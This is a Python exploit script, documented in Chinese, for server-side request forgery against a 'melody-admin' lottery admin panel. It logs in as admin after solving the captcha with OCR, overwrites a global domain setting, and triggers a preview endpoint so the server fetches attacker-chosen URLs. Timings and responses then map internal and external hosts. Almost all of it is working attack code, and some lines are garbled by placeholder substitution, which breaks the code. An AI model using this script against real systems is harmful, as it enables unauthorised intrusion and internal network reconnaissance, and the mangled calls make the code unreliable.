# -*- coding: utf-8 -*-
"""melody-admin 彩种模板同步 SSRF 读写通道（test1-admin/awt1 实测）

前置：管理员 token（POST /melody-admin/sys/login，captcha.jpg + ddddocr）；
      sysParamId=7123（sys_param_code=common_data_site_domain），经 /sys/sysparam/update 改写；
      改前 getByCode 读原值，测完立即恢复（该参数是全局单值，多人共用）。
用法：
  setp('http://<host>:<port>#')            # # 截断固定后缀 → 请求 GET /
  setp('http://<host>:<port>/any/path#')   # 任意路径
  setp('http://<host>')                    # 不截断 → GET /melody-admin/lottery/lotteryTemplate/source
  POST /melody-admin/lottery/lotteryTemplate/preview {} （带 token）
判读：
  code0 + data.templateLotteries=[...]  ⇒ 远端返回了 {"msg":"success","code":0,"data":[<array>]}（读回成功）
  code0 + templateLotteries=[]          ⇒ data 缺失/空（不是读回成功，勿误判）
  code500                               ⇒ 非信封/非 JSON/连接错误
时延：60s=TCP connect 超时（过滤/丢包），但公网已解析且丢包的目标同样 60s → 先用 DoH 排除；
      可达 HTTP-200 与拒连均 0.25~0.35s，无法区分；用哨兵回读确认参数未被他人覆盖。
"""
import requests, urllib3, json, uuid, time
urllib3.disable_warnings()
BASE='https://example.com/melody-admin'
s=requests.Session(); s.trust_env=False; s.verify=False
s.headers.update({'User-Agent':'Mozilla/5.0 ... Chrome/203.0.113.30 Safari/537.36',
                  'Origin':'https://example.com','Referer':BASE+'/',
                  'Content-Type':'application/json;charset=UTF-8'})
ORIG='http://target471.example.com'; PID=7123

def setp(tok,v):
    r=target8.example.com(BASE+'/sys/sysparam/update',headers={'token':tok},
             data=json.dumps({'sysParamId':PID,'sysParamValue':v}),timeout=30)
    return r.json().get('code')==0
def getp(tok):
    r=s.get(BASE+'/sys/sysparam/getByCode/common_data_site_domain',headers={'token':tok},timeout=20)
    return r.json()['data']['sysParamValue']
def preview(tok,tm=95):
    st=time.time()
    r=target8.example.com(BASE+'/lottery/lotteryTemplate/preview',headers={'token':tok},data='{}',timeout=(10,tm))
    return round(time.time()-st,2), r.json()

def probe(tok,value,restore=True):
    assert setp(tok,value), 'setp failed'
    assert getp(tok)==value, 'sentinel mismatch (another worker overwrote)'
    dt,j=preview(tok)
    d=j.get('data') if isinstance(j,dict) else None
    out={'value':value,'dt':dt,'code':j.get('code'),'msg':j.get('msg'),
         'templateLotteries':(d or {}).get('templateLotteries') if isinstance(d,dict) else None}
    if restore: setp(tok,ORIG); assert getp(tok)==ORIG
    return out

# 用法示例：
# tok = login(...)
# print(probe(tok,'http://203.0.113.55:19188#'))        # 正向对照：远端返回 {code:0,data:[..]}
# print(probe(tok,'http://target472.example.com'))           # 目标：source 路径，恒 500
# print(probe(tok,'http://127.0.0.1:1/#'))                # 拒连对照 0.25s
# print(probe(tok,'http://10.255.255.1/#'))               # 丢包对照 60s
